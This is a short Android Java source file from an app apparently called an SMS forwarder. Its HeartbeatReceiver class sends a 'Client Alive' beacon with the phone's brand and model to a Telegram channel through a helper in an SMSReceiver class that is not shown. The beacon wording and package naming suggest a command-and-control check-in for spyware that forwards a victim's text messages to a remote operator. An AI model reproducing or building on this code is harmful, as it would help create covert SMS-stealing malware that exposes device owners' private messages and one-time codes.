package com.lucifer.smsforwarder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class HeartbeatReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String heartbeat = "✅ Client Alive\n📱 Device: " + Build.BRAND + " " + Build.MODEL;


        SMSReceiver.sendTelegramDirect(heartbeat);
    }
}
